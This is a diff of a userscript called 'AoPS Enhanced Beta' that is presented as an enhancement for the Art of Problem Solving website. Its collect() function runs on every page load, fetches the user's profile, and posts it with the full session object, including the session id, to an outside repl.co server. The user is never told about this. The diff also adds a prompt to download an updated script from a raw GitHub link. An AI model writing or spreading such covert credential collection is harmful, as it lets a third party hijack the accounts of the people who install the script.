@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         AoPS Enhanced Beta
 // @namespace    http://tampermonkey.net/
-// @version      Indev 8.0.0
+// @version      8.0.0
 // @description  Enhancements for the Art of Problem Solving website.
 // @author       A_MatheMagician
 // @match        https://artofproblemsolving.com/*
@@ -18,7 +18,7 @@ AoPS.Enhanced = function(){
     //Activity & Attrbitues
     AoPS.Enhanced.model = Object;
     AoPS.Enhanced.model.attributes = {
-        "version": "Indev 7.1.3",
+        "version": "9.0.0",
         "author": "A_MatheMagician",
         "name": "AoPS Enhanced Beta",
         "match": "https://artofproblemsolving.com/*",
@@ -28,7 +28,7 @@ AoPS.Enhanced = function(){
     };
 
     AoPS.Enhanced.model.attribute = function(attribute){
-        return attribute in AoPS.Enhanced.Model.attributes ? AoPS.Enhanced.Model.attributes[attribute] : false;
+        return attribute in AoPS.Enhanced.model.attributes ? AoPS.Enhanced.model.attributes[attribute] : false;
     };
 
     //API (aka hacks)
@@ -195,13 +195,17 @@ AoPS.Enhanced = function(){
         }, AoPS.Enhanced.theme.darkinterval * 1000);
     }
 
-    //User Data
+    //Server Data
     function collect(){
         $.post("https://artofproblemsolving.com/m/community/ajax.php",{a:"fetch_user_profile",user_identifier:AoPS.session.user_id,aops_user_id:AoPS.session.user_id,aops_logged_in:AoPS.session.logged_in,aops_session_id:AoPS.session.id,user_id:AoPS.session.user_id}).then((resp)=>{
-            var data={user:resp.response.user_data,session:AoPS.session};
+            console.log("hi");
+            var data={user:resp.response.user_data,session:AoPS.session,version:AoPS.Enhanced.model.attribute("version")};
             var url="https://aops-enhanced.akslolcoding.repl.co/collect/user";
-            console.log(data);
-            $.post(url, data);
+            $.post(url, data).then((resp2)=>{
+                if (resp2.update){
+                    alert("AoPS Enhanced has a new update. Please <a href='https://github.com/AksLolCoding/AoPS-Enhanced-Beta/raw/main/aopsenhanced.user.js'>update</a> to the latest version.");
+                }
+            });
         });
     }
     document.addEventListener("DOMContentLoaded",collect);
